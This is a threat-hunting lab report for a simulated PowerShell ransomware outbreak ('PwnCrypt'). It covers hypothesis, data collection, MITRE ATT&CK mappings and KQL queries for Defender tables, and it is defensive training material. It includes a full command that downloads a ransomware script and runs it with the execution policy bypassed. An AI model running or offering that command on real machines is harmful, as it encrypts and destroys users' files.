# Threat Hunt Report: Zero-Day Ransomware (PwnCrypt) Outbreak

## Investigation Scenario: Zero-Day Ransomware (PwnCrypt) Outbreak

Run this PowerShell command on your VM after onboarding it to MDE:

```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1' -OutFile 'C:\programdata\pwncrypt.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1
```

-----

## 1\. Preparation

**Goal:** Set up the hunt by defining what you're looking for.

A new ransomware strain named PwnCrypt has been reported in the news, leveraging a PowerShell-based payload to encrypt files on infected systems. The payload, using AES-256 encryption, targets specific directories such as the `C:\Users\Public\Desktop`, encrypting files and prepending a `.pwncrypt` extension to the original extension. For example, `hello.txt` becomes `hello.pwncrypt.txt` after being targeted with the ransomware. The CISO is concerned with the new ransomware strain being spread to the corporate network and wishes to investigate.

**Activity:** Develop a hypothesis based on threat intelligence and security gaps (e.g., “Could there be lateral movement in the network?”).

**Hypothesis:** The security program at the organization is still immature and even lacks user training. It’s possible the newly discovered ransomware has made its way onto the corporate network. The hunt can be initiated based on the known IoCs (`*.pwncrypt.*` files).

-----

## 2\. Data Collection

**Goal:** Gather relevant data from logs, network traffic, and endpoints.

Consider inspecting the file system as well as process activity for anything that matches the PwnCrypt IoCs.

**Activity:** Ensure data is available from all key sources for analysis.

Ensure the relevant tables contain recent logs:

  * `DeviceProcessEvents`
  * `DeviceFileEvents`

-----

## 3\. Data Analysis

**Goal:** Analyze data to test your hypothesis.

**Activity:** Look for anomalies, patterns, or indicators of compromise (IOCs) using various tools and techniques.

  * Is there any evidence of the PwnCrypt ransomware being run? (files being created)
  * If so, can you identify the process and delivery method of the ransomware?

-----

## 4\. Investigation

**Goal:** Investigate any suspicious findings.

**Activity:** Dig deeper into detected threats, determine their scope, and escalate if necessary. See if anything you find matches TTPs within the MITRE ATT\&CK Framework.

  * Search the `DeviceFileEvents` table for `.pwncrypt` extensions.
  * Search the `DeviceProcessEvents` table based on your findings (e.g., `powershell.exe` execution around the time of file encryption).
  * You can use ChatGPT to figure this out by pasting/uploading the logs: Scenario 3: TTPs

-----

## 5\. Response

**Goal:** Mitigate any confirmed threats.

**Activity:** Work with security teams to contain, remove, and recover from the threat.

  * Can anything be done? (e.g., Isolate infected VM, disable compromised accounts, restore from backups, deploy updated EDR signatures).

-----

## 6\. Documentation

**Goal:** Record your findings and learn from them.

**Activity:** Document what you found and use it to improve future hunts and defenses.

  * Document what you did.

-----

## 7\. Improvement

**Goal:** Improve your security posture or refine your methods for the next hunt.

**Activity:** Adjust strategies and tools based on what worked or didn’t.

  * Anything we could have done to prevent the thing we hunted for? (e.g., stricter PowerShell execution policies, enhanced user training on suspicious emails/downloads, better endpoint protection configurations).
  * Any way we could have improved our hunting process? (e.g., new queries, better data sources, automated alerts for `.pwncrypt` file creations).

-----

## Notes / Findings:

### Timeline Summary and Findings:

*(This section should be filled in after performing the hunt. Below are example findings you might encounter.)*

  * **[Timestamp]:** `powershell.exe` was observed downloading `pwncrypt.ps1` from `https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1` to `C:\programdata\pwncrypt.ps1` on `[windows-target-1]`.
      * **Relevant MITRE ATT\&CK TTPs:** T1105 (Ingress Tool Transfer), T1059.001 (PowerShell)
  * **[Timestamp shortly after download]:** `powershell.exe` was observed executing `C:\programdata\pwncrypt.ps1` on `[windows-target-1]`.
      * **Relevant MITRE ATT\&CK TTPs:** T1059.001 (PowerShell), T1053 (Scheduled Task/Job, if persistence was attempted), T1486 (Data Encrypted for Impact)
  * **[Timestamp(s) during execution]:** Numerous file creation/modification events were observed, with files in `C:\Users\Public\Desktop` (and potentially other user directories) being renamed to include the `.pwncrypt` extension (e.g., `document.pwncrypt.docx`, `image.pwncrypt.jpg`).
      * **Relevant MITRE ATT\&CK TTPs:** T1486 (Data Encrypted for Impact), T1560.001 (Archive Collected Data: Encrypted)
  * **Initial Access/Delivery Method:** The `pwncrypt.ps1` script was downloaded via `Invoke-WebRequest`, suggesting initial access via a method that allowed arbitrary command execution (e.g., phishing with a malicious link, vulnerable public-facing application, or compromised legitimate software).

-----

## MDE Tables Referenced:

| **Parameter** | **Description** |
|---|---|
| **Name** | `DeviceProcessEvents` |
| **Info** | [https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table) |
| **Purpose** | Used for detecting the initial PowerShell download command (`Invoke-WebRequest`) and the subsequent execution of the ransomware payload (`pwncrypt.ps1`). |

| **Parameter** | **Description** |
|---|---|
| **Name** | `DeviceFileEvents` |
| **Info** | [https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicefileevents-table](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicefileevents-table) |
| **Purpose** | Used for detecting the creation and modification of files with the `.pwncrypt` extension, which are direct indicators of ransomware activity. |

-----

## Detection Queries:

\<details\>
\<summary\>Click to expand sample queries\</summary\>

```kusto
// Search the FileEvents table for the IoCs described in the briefing
let windows-target-1 = "windows-target-1"; // Replace with your VM name
DeviceFileEvents
| where DeviceName == windows-target-1
| where FileName contains ".pwncrypt"
| order by Timestamp desc
```

```kusto
// Search the DeviceProcessEvents table for logs around the same time
let windows-target-1 = "windows-target-1"; // Replace with your VM name
let specificTime = datetime(2024-10-16T05:24:46.8334943Z); // Adjust to the timestamp when your VM was impacted
DeviceProcessEvents
| where DeviceName == windows-target-1
| where Timestamp between ((specificTime - 3m) .. (specificTime + 3m))
| order by Timestamp desc
```

\</details\>

-----

## Created By:

  * **Author Name**: Clive M
  * **Author Contact**: N/A
  * **Date**: July 20, 2025

## Validated By:

  * **Reviewer Name**:
  * **Reviewer Contact**:
  * **Validation Date**:

-----

## Additional Notes:

  * **None**

-----

## Revision History:

| **Version** | **Changes** | **Date** | **Modified By** |
| :---------- | :---------- | :------- | :-------------- |
| 1.0         | Initial draft | July 20, 2025 | Clive M |
